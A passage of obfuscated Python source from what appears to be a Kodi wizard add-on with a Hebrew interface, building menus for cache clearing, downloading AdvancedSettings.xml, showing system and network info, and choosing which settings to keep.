		addFile ('--- ניקוי חבילות בהפעלה: %s'%OO00OO00OOOOO0000 .replace ('true',OO0O0O000O0O00O00 ).replace ('false',OOO0O0OO0OOOO00O0 ),'togglesetting','clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2889
		addFile ('--- ניקוי תמונות ישנות בהפעלה: %s'%O000O0OOOOOO000OO .replace ('true',OO0O0O000O0O00O00 ).replace ('false',OOO0O0OO0OOOO00O0 ),'togglesetting','clearthumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2890
	addFile ('ניקוי וידאו קאש','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2891
	addFile ('Include Video Cache in Clear Cache: %s'%OO0O0O00OOOOO0OO0 .replace ('true',OO0O0O000O0O00O00 ).replace ('false',OOO0O0OO0OOOO00O0 ),'togglecache','includevideo',icon =ICONMAINT ,themeit =THEME3 )#line:2892
	if OO0O0O00OOOOO0OO0 =='true':#line:2893
		addFile ('--- Include All Video Addons: %s'%O0000000OOO0OO00O .replace ('true',OO0O0O000O0O00O00 ).replace ('false',OOO0O0OO0OOOO00O0 ),'togglecache','includeall',icon =ICONMAINT ,themeit =THEME3 )#line:2894
		addFile ('--- Include Bob: %s'%O0OO0000O0000OO0O .replace ('true',OO0O0O000O0O00O00 ).replace ('false',OOO0O0OO0OOOO00O0 ),'togglecache','includebob',icon =ICONMAINT ,themeit =THEME3 )#line:2895
		addFile ('--- Include Phoenix: %s'%O000OO00000OO0OO0 .replace ('true',OO0O0O000O0O00O00 ).replace ('false',OOO0O0OO0OOOO00O0 ),'togglecache','includephoenix',icon =ICONMAINT ,themeit =THEME3 )#line:2896
		addFile ('--- Include Specto: %s'%OO0000OOO00OOOOO0 .replace ('true',OO0O0O000O0O00O00 ).replace ('false',OOO0O0OO0OOOO00O0 ),'togglecache','includespecto',icon =ICONMAINT ,themeit =THEME3 )#line:2897
		addFile ('--- Include Exodus: %s'%O000OOO00000OO0O0 .replace ('true',OO0O0O000O0O00O00 ).replace ('false',OOO0O0OO0OOOO00O0 ),'togglecache','includeexodus',icon =ICONMAINT ,themeit =THEME3 )#line:2898
		addFile ('--- Include Salts: %s'%O0000O000O0O00000 .replace ('true',OO0O0O000O0O00O00 ).replace ('false',OOO0O0OO0OOOO00O0 ),'togglecache','includesalts',icon =ICONMAINT ,themeit =THEME3 )#line:2899
		addFile ('--- Include Salts HD Lite: %s'%OO000OO00O0OO000O .replace ('true',OO0O0O000O0O00O00 ).replace ('false',OOO0O0OO0OOOO00O0 ),'togglecache','includesaltslite',icon =ICONMAINT ,themeit =THEME3 )#line:2900
		addFile ('--- Include One Channel: %s'%OO0O0OOO0OO0OO0O0 .replace ('true',OO0O0O000O0O00O00 ).replace ('false',OOO0O0OO0OOOO00O0 ),'togglecache','includeonechan',icon =ICONMAINT ,themeit =THEME3 )#line:2901
		addFile ('--- Include Genesis: %s'%O000O0O0OOOOO0O00 .replace ('true',OO0O0O000O0O00O00 ).replace ('false',OOO0O0OO0OOOO00O0 ),'togglecache','includegenesis',icon =ICONMAINT ,themeit =THEME3 )#line:2902
		addFile ('--- Enable All Video Addons','togglecache','true',icon =ICONMAINT ,themeit =THEME3 )#line:2903
		addFile ('--- Disable All Video Addons','togglecache','false',icon =ICONMAINT ,themeit =THEME3 )#line:2904
	setView ('files','viewType')#line:2905
def advancedWindow (url =None ):#line:2907
	if not ADVANCEDFILE =='http://':#line:2908
		if url ==None :#line:2909
			OO00O0O000OO00000 =wiz .workingURL (ADVANCEDFILE )#line:2910
			O0OOO0OOOOO000OO0 =uservar .ADVANCEDFILE #line:2911
		else :#line:2912
			OO00O0O000OO00000 =wiz .workingURL (url )#line:2913
			O0OOO0OOOOO000OO0 =url #line:2914
		addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2915
		if os .path .exists (ADVANCED ):#line:2916
			addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2917
			addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2918
		if OO00O0O000OO00000 ==True :#line:2919
			if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONMAINT ,themeit =THEME3 )#line:2920
			OO0000O00O00O00OO =wiz .openURL (O0OOO0OOOOO000OO0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2921
			OO0O00OO0OOOO0O0O =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (OO0000O00O00O00OO )#line:2922
			if len (OO0O00OO0OOOO0O0O )>0 :#line:2923
				for OO00000OOO0OO00O0 ,O00OO0O0OOO0O00O0 ,url ,OO000O0O0O0O0OOOO ,O0OO0OO0O00OOO00O ,OO0000O0O0O00OOO0 in OO0O00OO0OOOO0O0O :#line:2924
					if O00OO0O0OOO0O00O0 .lower ()=="yes":#line:2925
						addDir ("[B]%s[/B]"%OO00000OOO0OO00O0 ,'advancedsetting',url ,description =OO0000O0O0O00OOO0 ,icon =OO000O0O0O0O0OOOO ,fanart =O0OO0OO0O00OOO00O ,themeit =THEME3 )#line:2926
					else :#line:2927
						addFile (OO00000OOO0OO00O0 ,'writeadvanced',OO00000OOO0OO00O0 ,url ,description =OO0000O0O0O00OOO0 ,icon =OO000O0O0O0O0OOOO ,fanart =O0OO0OO0O00OOO00O ,themeit =THEME2 )#line:2928
			else :wiz .log ("[Advanced Settings] ERROR: Invalid Format.")#line:2929
		else :wiz .log ("[Advanced Settings] URL not working: %s"%OO00O0O000OO00000 )#line:2930
	else :wiz .log ("[Advanced Settings] not Enabled")#line:2931
def writeAdvanced (O00O0OOOO00000000 ,OOO00000O00O0OO0O ):#line:2933
	O0O000000O0OO0OOO =wiz .workingURL (OOO00000O00O0OO0O )#line:2934
	if O0O000000O0OO0OOO ==True :#line:2935
		if os .path .exists (ADVANCED ):OOO00O0O0OO0OO0O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to overwrite your current Advanced Settings with [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,O00O0OOOO00000000 ),yeslabel ="[B][COLOR green]Overwrite[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]")#line:2936
		else :OOO00O0O0OO0OO0O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,O00O0OOOO00000000 ),yeslabel ="[B][COLOR green]התקנה[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:2937
		if OOO00O0O0OO0OO0O0 ==1 :#line:2939
			O000O0O0O000000OO =wiz .openURL (OOO00000O00O0OO0O )#line:2940
			O00OOO0OOOO000O0O =open (ADVANCED ,'w');#line:2941
			O00OOO0OOOO000O0O .write (O000O0O0O000000OO )#line:2942
			O00OOO0OOOO000O0O .close ()#line:2943
			DIALOG .ok (ADDONTITLE ,'[COLOR %s]AdvancedSettings.xml file has been successfully written.  Once you click okay it will force close kodi.[/COLOR]'%COLOR2 )#line:2944
			wiz .killxbmc (True )#line:2945
		else :wiz .log ("[Advanced Settings] install canceled");wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Write Cancelled![/COLOR]"%COLOR2 );return #line:2946
	else :wiz .log ("[Advanced Settings] URL not working: %s"%O0O000000O0OO0OOO );wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]URL Not Working[/COLOR]"%COLOR2 )#line:2947
def viewAdvanced ():#line:2949
	O0O0OOO0OOOOOO0O0 =open (ADVANCED )#line:2950
	O0000O0O0OO00OO00 =O0O0OOO0OOOOOO0O0 .read ().replace ('\t','    ')#line:2951
	wiz .TextBox (ADDONTITLE ,O0000O0O0OO00OO00 )#line:2952
	O0O0OOO0OOOOOO0O0 .close ()#line:2953
def removeAdvanced ():#line:2955
	if os .path .exists (ADVANCED ):#line:2956
		wiz .removeFile (ADVANCED )#line:2957
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]AdvancedSettings.xml not found[/COLOR]")#line:2958
def showAutoAdvanced ():#line:2960
	notify .autoConfig ()#line:2961
def getIP ():#line:2963
	OO000OO00OOOO0OOO ='http://whatismyipaddress.com/'#line:2964
	if not wiz .workingURL (OO000OO00OOOO0OOO ):return 'Unknown','Unknown','Unknown'#line:2965
	OO000O0O00O0O0OO0 =wiz .openURL (OO000OO00OOOO0OOO ).replace ('\n','').replace ('\r','')#line:2966
	if not 'Access Denied'in OO000O0O00O0O0OO0 :#line:2967
		O000OO00OO000O0OO =re .compile ('whatismyipaddress.com/ip/(.+?)"').findall (OO000O0O00O0O0OO0 )#line:2968
		O0O00O00OOO0OOO00 =O000OO00OO000O0OO [0 ]if (len (O000OO00OO000O0OO )>0 )else 'Unknown'#line:2969
		OOOO0000000OO000O =re .compile ('"font-size:14px;">(.+?)</td>').findall (OO000O0O00O0O0OO0 )#line:2970
		O0OOO0OO0O0OOO000 =OOOO0000000OO000O [0 ]if (len (OOOO0000000OO000O )>0 )else 'Unknown'#line:2971
		OO0O0000O0OOOOO0O =OOOO0000000OO000O [1 ]+', '+OOOO0000000OO000O [2 ]+', '+OOOO0000000OO000O [3 ]if (len (OOOO0000000OO000O )>2 )else 'Unknown'#line:2972
		return O0O00O00OOO0OOO00 ,O0OOO0OO0O0OOO000 ,OO0O0000O0OOOOO0O #line:2973
	else :return 'Unknown','Unknown','Unknown'#line:2974
def systemInfo ():#line:2976
	O0OO0OO0000000000 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2990
	OO0OOOO0O0OO0OO00 =[];OOOO00O00O0000000 =0 #line:2991
	for OOOO0O0OOOOOO000O in O0OO0OO0000000000 :#line:2992
		OO0OO00O000O0O000 =wiz .getInfo (OOOO0O0OOOOOO000O )#line:2993
		OO00OO00OO0O00OO0 =0 #line:2994
		while OO0OO00O000O0O000 =="Busy"and OO00OO00OO0O00OO0 <10 :#line:2995
			OO0OO00O000O0O000 =wiz .getInfo (OOOO0O0OOOOOO000O );OO00OO00OO0O00OO0 +=1 ;wiz .log ("%s sleep %s"%(OOOO0O0OOOOOO000O ,str (OO00OO00OO0O00OO0 )));xbmc .sleep (1000 )#line:2996
		OO0OOOO0O0OO0OO00 .append (OO0OO00O000O0O000 )#line:2997
		OOOO00O00O0000000 +=1 #line:2998
	OO0OOO0000OOO0000 =OO0OOOO0O0OO0OO00 [8 ]if 'Una'in OO0OOOO0O0OO0OO00 [8 ]else wiz .convertSize (int (float (OO0OOOO0O0OO0OO00 [8 ][:-8 ]))*1024 *1024 )#line:2999
	O00O0OOO0OOO0O0OO =OO0OOOO0O0OO0OO00 [9 ]if 'Una'in OO0OOOO0O0OO0OO00 [9 ]else wiz .convertSize (int (float (OO0OOOO0O0OO0OO00 [9 ][:-8 ]))*1024 *1024 )#line:3000
	O00000OO0000O00O0 =OO0OOOO0O0OO0OO00 [10 ]if 'Una'in OO0OOOO0O0OO0OO00 [10 ]else wiz .convertSize (int (float (OO0OOOO0O0OO0OO00 [10 ][:-8 ]))*1024 *1024 )#line:3001
	O000000OO0OOO000O =wiz .convertSize (int (float (OO0OOOO0O0OO0OO00 [11 ][:-2 ]))*1024 *1024 )#line:3002
	O00OO00O00OOO0OO0 =wiz .convertSize (int (float (OO0OOOO0O0OO0OO00 [12 ][:-2 ]))*1024 *1024 )#line:3003
	O0O000000OO0O0O0O =wiz .convertSize (int (float (OO0OOOO0O0OO0OO00 [13 ][:-2 ]))*1024 *1024 )#line:3004
	OOOOOO0O00OO00O00 ,OO0O0OOO00OOO0OO0 ,OOO000O0OOO00000O =getIP ()#line:3005
	OOO0000OO00O00O0O =[];OOO00O0OOO0O00O00 =[];OOO000OOO0O00O00O =[];O00OO000OO0000O0O =[];O0O00OO0O000O000O =[];OO0OO0000OOOOOOO0 =[];OO000OOOOOOOOO0O0 =[]#line:3007
	O00OOO0OOOO0000O0 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3009
	for OO000OOOOO000OO0O in sorted (O00OOO0OOOO0000O0 ,key =lambda O0OO00OO0O00O0O0O :O0OO00OO0O00O0O0O ):#line:3010
		OOO0OO000OOO0O0OO =os .path .split (OO000OOOOO000OO0O [:-1 ])[1 ]#line:3011
		if OOO0OO000OOO0O0OO =='packages':continue #line:3012
		O000O0O00OOOOO00O =os .path .join (OO000OOOOO000OO0O ,'addon.xml')#line:3013
		if os .path .exists (O000O0O00OOOOO00O ):#line:3014
			O00OO0O000000O0OO =open (O000O0O00OOOOO00O )#line:3015
			O0OOOO0OO0OO0OO0O =O00OO0O000000O0OO .read ()#line:3016
			OOOOO00O000O000OO =re .compile ("<provides>(.+?)</provides>").findall (O0OOOO0OO0OO0OO0O )#line:3017
			if len (OOOOO00O000O000OO )==0 :#line:3018
				if OOO0OO000OOO0O0OO .startswith ('skin'):OO000OOOOOOOOO0O0 .append (OOO0OO000OOO0O0OO )#line:3019
				if OOO0OO000OOO0O0OO .startswith ('repo'):O0O00OO0O000O000O .append (OOO0OO000OOO0O0OO )#line:3020
				else :OO0OO0000OOOOOOO0 .append (OOO0OO000OOO0O0OO )#line:3021
			elif not (OOOOO00O000O000OO [0 ]).find ('executable')==-1 :O00OO000OO0000O0O .append (OOO0OO000OOO0O0OO )#line:3022
			elif not (OOOOO00O000O000OO [0 ]).find ('video')==-1 :OOO000OOO0O00O00O .append (OOO0OO000OOO0O0OO )#line:3023
			elif not (OOOOO00O000O000OO [0 ]).find ('audio')==-1 :OOO00O0OOO0O00O00 .append (OOO0OO000OOO0O0OO )#line:3024
			elif not (OOOOO00O000O000OO [0 ]).find ('image')==-1 :OOO0000OO00O00O0O .append (OOO0OO000OOO0O0OO )#line:3025
	addFile ('[B]Media Center Info:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3027
	addFile ('[COLOR %s]Name:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OOOO0O0OO0OO00 [0 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3028
	addFile ('[COLOR %s]Version:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OOOO0O0OO0OO00 [1 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3029
	addFile ('[COLOR %s]Platform:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,wiz .platform ().title ()),'',icon =ICONMAINT ,themeit =THEME3 )#line:3030
	addFile ('[COLOR %s]CPU Usage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OOOO0O0OO0OO00 [2 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3031
	addFile ('[COLOR %s]Screen Mode:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OOOO0O0OO0OO00 [3 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3032
	addFile ('[B]Uptime:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3034
	addFile ('[COLOR %s]Current Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OOOO0O0OO0OO00 [6 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3035
	addFile ('[COLOR %s]Total Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OOOO0O0OO0OO00 [7 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3036
	addFile ('[B]Local Storage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3038
	addFile ('[COLOR %s]Used Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OOO0000OOO0000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3039
	addFile ('[COLOR %s]Free Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00O0OOO0OOO0O0OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3040
	addFile ('[COLOR %s]Total Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00000OO0000O00O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3041
	addFile ('[B]Ram Usage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3043
	addFile ('[COLOR %s]Used Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000000OO0OOO000O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3044
	addFile ('[COLOR %s]Free Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00OO00O00OOO0OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3045
	addFile ('[COLOR %s]Total Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O000000OO0O0O0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3046
	addFile ('[B]Network:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3048
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OOOO0O0OO0OO00 [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3049
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOOO0O00OO00O00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3050
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0O0OOO00OOO0OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3051
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO000O0OOO00000O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3052
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OOOO0O0OO0OO00 [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3053
	OO00OOO0OO000O0O0 =len (OOO0000OO00O00O0O )+len (OOO00O0OOO0O00O00 )+len (OOO000OOO0O00O00O )+len (O00OO000OO0000O0O )+len (OO0OO0000OOOOOOO0 )+len (OO000OOOOOOOOO0O0 )+len (O0O00OO0O000O000O )#line:3055
	addFile ('[B]Addons([COLOR %s]%s[/COLOR]):[/B]'%(COLOR1 ,OO00OOO0OO000O0O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3056
	addFile ('[COLOR %s]Video Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOO000OOO0O00O00O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3057
	addFile ('[COLOR %s]Program Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O00OO000OO0000O0O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3058
	addFile ('[COLOR %s]Music Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOO00O0OOO0O00O00 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3059
	addFile ('[COLOR %s]Picture Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOO0000OO00O00O0O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3060
	addFile ('[COLOR %s]Repositories:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0O00OO0O000O000O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3061
	addFile ('[COLOR %s]Skins:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO000OOOOOOOOO0O0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3062
	addFile ('[COLOR %s]Scripts/Modules:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO0OO0000OOOOOOO0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3063
def Menu ():#line:3064
	addDir ('אפשרויות נוספות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:3065
def saveMenu ():#line:3067
	O0OOO00O00000O000 ='[COLOR yellow]מופעל[/COLOR]';O000000OOOOO0O00O ='[COLOR blue]מבוטל[/COLOR]'#line:3069
	O00O000OOOOO00O0O ='true'if KEEPMOVIEWALL =='true'else 'false'#line:3070
	OOOO0O0O000OO0O00 ='true'if KEEPMOVIELIST =='true'else 'false'#line:3071
	OOOOO00O0O000OOOO ='true'if KEEPINFO =='true'else 'false'#line:3072
	OO0OO00O0O0O0O000 ='true'if KEEPSOUND =='true'else 'false'#line:3074
	O000OOO00OO00O0O0 ='true'if KEEPVIEW =='true'else 'false'#line:3075
	OOO0O0OO0000000O0 ='true'if KEEPSKIN =='true'else 'false'#line:3076
	OO0O0OO0O00O0O00O ='true'if KEEPSKIN2 =='true'else 'false'#line:3077
	OOOO0OO0OOO0OOOOO ='true'if KEEPSKIN3 =='true'else 'false'#line:3078
	OOOOOOOOO0O0O0000 ='true'if KEEPADDONS =='true'else 'false'#line:3079
	OO0O00OOOO000000O ='true'if KEEPPVR =='true'else 'false'#line:3080
	OOOOO00O0OO000OO0 ='true'if KEEPTVLIST =='true'else 'false'#line:3081
	O0OO000OO00O00OOO ='true'if KEEPHUBMOVIE =='true'else 'false'#line:3082
	OOOOOOO0OO0O0OOO0 ='true'if KEEPHUBTVSHOW =='true'else 'false'#line:3083
	O0OOOOOOOOOO0OO00 ='true'if KEEPHUBTV =='true'else 'false'#line:3084
	O00OOOO00O0OO0000 ='true'if KEEPHUBVOD =='true'else 'false'#line:3085
	O0O0OO0O0O0O0OO0O ='true'if KEEPHUBSPORT =='true'else 'false'#line:3086
	O00O00O000OO0OOO0 ='true'if KEEPHUBKIDS =='true'else 'false'#line:3087
	O000O00OO00OOOOOO ='true'if KEEPHUBMUSIC =='true'else 'false'#line:3088
	OOOO0000O000O00OO ='true'if KEEPHUBMENU =='true'else 'false'#line:3089
	OOOOO00OOOOO0O0OO ='true'if KEEPPLAYLIST =='true'else 'false'#line:3090
	O0O0OOO0O0000O0O0 ='true'if KEEPTRAKT =='true'else 'false'#line:3091
	OOOO0OOO0OOO00OOO ='true'if KEEPREAL =='true'else 'false'#line:3092
	O0O00OO0OOO000OOO ='true'if KEEPRD2 =='true'else 'false'#line:3093
	O0OO0000O00OOO000 ='true'if KEEPTORNET =='true'else 'true'#line:3094
	OOO0OO00O0O0O0OOO ='true'if KEEPLOGIN =='true'else 'false'#line:3095
	O000OO0OO000OO00O ='true'if KEEPSOURCES =='true'else 'false'#line:3096
	OO00OOO0OOO0000OO ='true'if KEEPADVANCED =='true'else 'false'#line:3097
	OO00000O000OOOOOO ='true'if KEEPPROFILES =='true'else 'false'#line:3098
	O00OOO0OO00O0O0O0 ='true'if KEEPFAVS =='true'else 'false'#line:3099
	O0000OO0000O0OO0O ='true'if KEEPREPOS =='true'else 'false'#line:3100
	OOOOO0O00O00O0000 ='true'if KEEPSUPER =='true'else 'false'#line:3101
	O00O0O0O00O0OOOO0 ='true'if KEEPWHITELIST =='true'else 'false'#line:3102
	OO00OOO00OOOOOOOO ='true'if KEEPWEATHER =='true'else 'false'#line:3103
	if O00O0O0O00O0OOOO0 =='true':#line:3107
		addFile ('בחר הרחבות לשמירה','whitelist','edit',icon =ICONSAVE ,themeit =THEME1 )#line:3108
		addFile ('רשימת ההרחבות שבחרתי לשמור','whitelist','view',icon =ICONSAVE ,themeit =THEME1 )#line:3109
		addFile ('נקה רשימת הרחבות','whitelist','clear',icon =ICONSAVE ,themeit =THEME1 )#line:3110
		addFile ('יבה רשימת הרחבות','whitelist','import',icon =ICONSAVE ,themeit =THEME1 )#line:3111
		addFile ('יצא רשימת הרחבות','whitelist','export',icon =ICONSAVE ,themeit =THEME1 )#line:3112
	addFile ('%s התקנת קיר סרטים: '%O00O000OOOOO00O0O .replace ('true',O0OOO00O00000O000 ).replace ('false',O000000OOOOO0O00O ),'togglesetting','keepmoviewall',icon =ICONTRAKT ,themeit =THEME1 )#line:3114
	addFile ('%s שמירת חשבון RD:  '%OOOO0OOO0OOO00OOO .replace ('true',O0OOO00O00000O000 ).replace ('false',O000000OOOOO0O00O ),'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME1 )#line:3115
	addFile ('%s שמירת חשבון טראקט:  '%O0O0OOO0O0000O0O0 .replace ('true',O0OOO00O00000O000 ).replace ('false',O000000OOOOO0O00O ),'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME1 )#line:3116
	addFile ('%s שמירת מועדפים:  '%O00OOO0OO00O0O0O0 .replace ('true',O0OOO00O00000O000 ).replace ('false',O000000OOOOO0O00O ),'togglesetting','keepfavourites',icon =ICONSAVE ,themeit =THEME1 )#line:3119
	addFile ('%s שמירת לקוח טלוויזיה:  '%OO0O00OOOO000000O .replace ('true',O0OOO00O00000O000 ).replace ('false',O000000OOOOO0O00O ),'togglesetting','keeppvr',icon =ICONTRAKT ,themeit =THEME1 )#line:3120
	addFile ('%s שמירת רשימת עורצי טלוויזיה:  '%OOOOO00O0OO000OO0 .replace ('true',O0OOO00O00000O000 ).replace ('false',O000000OOOOO0O00O ),'togglesetting','keeptvlist',icon =ICONTRAKT ,themeit =THEME1 )#line:3121
	addFile ('%s שמירת אריח סרטים:  '%O0OO000OO00O00OOO .replace ('true',O0OOO00O00000O000 ).replace ('false',O000000OOOOO0O00O ),'togglesetting','keephubmovie',icon =ICONTRAKT ,themeit =THEME1 )#line:3122
	addFile ('%s שמירת אריח סדרות:  '%OOOOOOO0OO0O0OOO0 .replace ('true',O0OOO00O00000O000 ).replace ('false',O000000OOOOO0O00O ),'togglesetting','keephubtvshow',icon =ICONTRAKT ,themeit =THEME1 )#line:3123
	addFile ('%s שמירת אריח טלויזיה:  '%O0OOOOOOOOOO0OO00 .replace ('true',O0OOO00O00000O000 ).replace ('false',O000000OOOOO0O00O ),'togglesetting','keephubtv',icon =ICONTRAKT ,themeit =THEME1 )#line:3124
	addFile ('%s שמירת אריח תוכן ישראלי:  '%O00OOOO00O0OO0000 .replace ('true',O0OOO00O00000O000 ).replace ('false',O000000OOOOO0O00O ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3125
	addFile ('%s שמירת אריח ספורט:  '%O0O0OO0O0O0O0OO0O .replace ('true',O0OOO00O00000O000 ).replace ('false',O000000OOOOO0O00O ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3126
	addFile ('%s שמירת אריח ילדים:  '%O00O00O000OO0OOO0 .replace ('true',O0OOO00O00000O000 ).replace ('false',O000000OOOOO0O00O ),'togglesetting','keephubkids',icon =ICONTRAKT ,themeit =THEME1 )#line:3127
	addFile ('%s שמירת אריח מוסיקה:  '%O000O00OO00OOOOOO .replace ('true',O0OOO00O00000O000 ).replace ('false',O000000OOOOO0O00O ),'togglesetting','keephubmusic',icon =ICONTRAKT ,themeit =THEME1 )#line:3128
	addFile ('%s שמירת תפריט אריחים ראשי:  '%OOOO0000O000O00OO .replace ('true',O0OOO00O00000O000 ).replace ('false',O000000OOOOO0O00O ),'togglesetting','keephubmenu',icon =ICONTRAKT ,themeit =THEME1 )#line:3129
	addFile ('%s שמירת כל האריחים בסקין:  '%OOO0O0OO0000000O0 .replace ('true',O0OOO00O00000O000 ).replace ('false',O000000OOOOO0O00O ),'togglesetting','keepskin',icon =ICONTRAKT ,themeit =THEME1 )#line:3130
	addFile ('%s שמירת הגדרות מזג האוויר:  '%OO00OOO00OOOOOOOO .replace ('true',O0OOO00O00000O000 ).replace ('false',O000000OOOOO0O00O ),'togglesetting','keepweather',icon =ICONTRAKT ,themeit =THEME1 )#line:3131
	addFile ('%s שמירת הרחבות שהתקנתי:  '%OOOOOOOOO0O0O0000 .replace ('true',O0OOO00O00000O000 ).replace ('false',O000000OOOOO0O00O ),'togglesetting','keepaddons',icon =ICONTRAKT ,themeit =THEME1 )#line:3137
	addFile ('%s שמירת סיסמאות, חשבונות ,מיקומי הורדות:  '%OOOOO00O0O000OOOO .replace ('true',O0OOO00O00000O000 ).replace ('false',O000000OOOOO0O00O ),'togglesetting','keepinfo',icon =ICONTRAKT ,themeit =THEME1 )#line:3138
	addFile ('%s שמירת ספריית סרטים וסדרות:  '%OOOO0O0O000OO0O00 .replace ('true',O0OOO00O00000O000 ).replace ('false',O000000OOOOO0O00O ),'togglesetting','keepmovielist',icon =ICONTRAKT ,themeit =THEME1 )#line:3141
	addFile ('%s שמירת מקורות וידאו:  '%O000OO0OO000OO00O .replace ('true',O0OOO00O00000O000 ).replace ('false',O000000OOOOO0O00O ),'togglesetting','keepsources',icon =ICONSAVE ,themeit =THEME1 )#line:3142
